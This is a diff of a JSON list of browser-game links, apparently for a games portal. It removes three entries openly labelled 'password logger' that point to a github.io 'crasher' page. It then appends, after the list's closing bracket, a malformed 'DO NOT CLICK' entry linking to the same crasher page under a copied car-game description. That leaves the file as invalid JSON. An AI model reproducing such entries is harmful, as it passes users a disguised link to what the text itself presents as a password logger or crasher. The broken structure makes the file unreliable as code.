@@ -12,21 +12,118 @@
     "icon": "fas fa-cube"
   },
   {
-    "title": "password logger",
-    "url": "https://viroda1.github.io/crasher/3",
-    "description": "gives me ur passwords XD",
-    "icon": "fas fa-circle"
+    "title": "Retro Bowl",
+    "url": "https://retrobowl.me/",
+    "description": "Classic football management game. Build your team, lead them to the championship!",
+    "icon": "fas fa-football"
   },
   {
-    "title": "password logger 2",
-    "url": "https://viroda1.github.io/crasher/4",
-    "description": "gives me ur passwords XD",
-    "icon": "fas fa-circle"
+    "title": "Shell Shockers",
+    "url": "https://shellshock.io/",
+    "description": "Egg-based multiplayer FPS. Crack your opponents in this chaotic shooter!",
+    "icon": "fas fa-egg"
   },
   {
-    "title": "password logger 3",
-    "url": "https://viroda1.github.io/crasher/5",
-    "description": "gives me ur passwords XD",
-    "icon": "fas fa-circle"
+    "title": "Krunker.io",
+    "url": "https://krunker.io/",
+    "description": "Fast-paced browser FPS with custom maps and competitive gameplay.",
+    "icon": "fas fa-crosshairs"
+  },
+  {
+    "title": "Slope",
+    "url": "https://slope-game.io/",
+    "description": "Roll down an endless track, avoid obstacles, and set high scores in this 3D runner.",
+    "icon": "fas fa-chart-line"
+  },
+  {
+    "title": "Run 3",
+    "url": "https://run3.io/",
+    "description": "Navigate through space tunnels with gravity-defying jumps. Endless runner classic.",
+    "icon": "fas fa-running"
+  },
+  {
+    "title": "Tunnel Rush",
+    "url": "https://tunnelrush.io/",
+    "description": "Dodge obstacles at high speed through a psychedelic tunnel. Reflexes required!",
+    "icon": "fas fa-tachometer-alt"
+  },
+  {
+    "title": "Geometry Dash",
+    "url": "https://geometrydash.io/",
+    "description": "Rhythm-based action platformer. Jump, fly, and flip past spikes and obstacles.",
+    "icon": "fas fa-music"
+  },
+  {
+    "title": "1v1.LOL",
+    "url": "https://1v1.lol/",
+    "description": "Build and battle in this Fortnite-style competitive shooter. Climb the ranks!",
+    "icon": "fas fa-building"
+  },
+  {
+    "title": "Minecraft Classic",
+    "url": "https://classic.minecraft.net/",
+    "description": "The original browser-based Minecraft. Build, mine, and create freely.",
+    "icon": "fas fa-cube"
+  },
+  {
+    "title": "Cookie Clicker",
+    "url": "https://orteil.dashnet.org/cookieclicker/",
+    "description": "The legendary idle clicker. Bake cookies, upgrade, and conquer the universe.",
+    "icon": "fas fa-cookie-bite"
+  },
+  {
+    "title": "Papa's Freezeria",
+    "url": "https://www.crazygames.com/game/papas-freezeria",
+    "description": "Run your own ice cream shop. Take orders, mix ingredients, and serve customers.",
+    "icon": "fas fa-ice-cream"
+  },
+  {
+    "title": "Friday Night Funkin'",
+    "url": "https://ninja-muffin24.itch.io/funkin",
+    "description": "Rhythm battle game. Rap against your girlfriend's dad and other challengers.",
+    "icon": "fas fa-microphone-alt"
+  },
+  {
+    "title": "Happy Wheels",
+    "url": "https://happywheels.io/",
+    "description": "Physics-based obstacle course game. Hilarious and gory ragdoll action.",
+    "icon": "fas fa-wheelchair"
+  },
+  {
+    "title": "Fireboy and Watergirl",
+    "url": "https://fireboyandwatergirl.co/",
+    "description": "Co-op puzzle adventure. Control both characters to reach the exit.",
+    "icon": "fas fa-hand-holding-heart"
+  },
+  {
+    "title": "Bloons Tower Defense",
+    "url": "https://ninjakiwi.com/Games/Bloons-Tower-Defense/Play/BloonsTD6",
+    "description": "Strategic tower defense. Pop bloons with monkeys and upgrades.",
+    "icon": "fas fa-monkey"
+  },
+  {
+    "title": "Subway Surfers",
+    "url": "https://poki.com/en/g/subway-surfers",
+    "description": "Endless runner classic. Dash through trains, dodge obstacles, collect coins.",
+    "icon": "fas fa-subway"
+  },
+  {
+    "title": "Basketball Stars",
+    "url": "https://basketballstars.io/",
+    "description": "Multiplayer basketball game. Dribble, shoot, and compete online.",
+    "icon": "fas fa-basketball-ball"
+  },
+  {
+    "title": "Drift Hunters",
+    "url": "https://drifthunters.io/",
+    "description": "Car drifting simulator. Customize cars and master drift tracks.",
+    "icon": "fas fa-car"
   }
-]
+] 
+title": "DO NOT CLICK",
+    "url": "https://viroda1.github.io/crasher/4",
+    "description": "Car drifting simulator. Customize cars and master drift tracks.",
+    "icon": "fas fa-hand"
+  }
+] 
+
